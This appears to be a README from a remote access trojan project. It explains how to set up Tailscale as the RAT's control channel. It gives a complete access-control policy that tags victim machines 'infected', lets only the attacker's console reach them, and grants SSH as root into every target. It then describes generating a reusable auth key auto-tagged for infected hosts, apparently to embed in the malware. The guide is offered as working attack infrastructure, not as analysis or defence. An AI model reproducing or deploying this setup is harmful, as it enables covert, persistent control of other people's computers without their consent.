# Tailscale Service
---

## Overview
For this RAT you need Tailscale to remote access computer outside your network. 

## Resources
    For the RAT you only need the Auth Key from Tailscale the rest you will find here.

1. Make an Account for Tailscale (I used Github)
    [Tailscale Login](https://login.tailscale.com/login?next_url=%2Fwelcome)
2. Install Tailscale for your Computer
    [Tailscale Download](https://tailscale.com/download)

3. Go to "Access Control" and add this script ( For "your_name" if you used Github as login, put your Github name in )
[ Access Conrol](https://login.tailscale.com/admin/acls/file)
    ```json
    {
    "groups": {
        "group:console": ["your_name@github.com"],          // creates a group with the name "console" with only you inside 
    },

    "tagOwners": {                                          // creates 2 tags for your computer and targets
        "tag:ConsoleDevice": ["autogroup:admin"],           // Your computer
        "tag:infected":      ["autogroup:admin"],           // Your Targets
    },

    "acls": [                                     
        // Adds that your computer can acces the targets, but your targets not you
        { "action": "accept", "src": ["tag:ConsoleDevice"], "dst": ["tag:infected:*"] },
    ],

    "ssh": [                                                // Adds that your computer can ssh all targets per tailscale ssh 
        {
            "action": "check",
            "src":    ["group:console"],
            "dst":    ["tag:infected"],
            "users":  ["autogroup:nonroot", "root"],
        },
    ],
    }
    ```
4. Now go to "Settings" and click on "Keys" on the left side
    [Tailscale Keys](https://login.tailscale.com/admin/settings/keys)
    
    - Generate auth key
    - Customize Key
        - add Description
        - check the mark for "Reusable"
        - Set Expiration to 90
    - Enable tags
        - add tags
        - click on tag:infected
    - Generate key